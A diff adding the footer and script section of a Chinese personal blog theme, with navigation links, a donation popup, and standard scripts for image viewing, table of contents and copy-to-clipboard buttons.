+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E7%BC%96%E7%A8%8B/">编程</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/CTF/">CTF</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
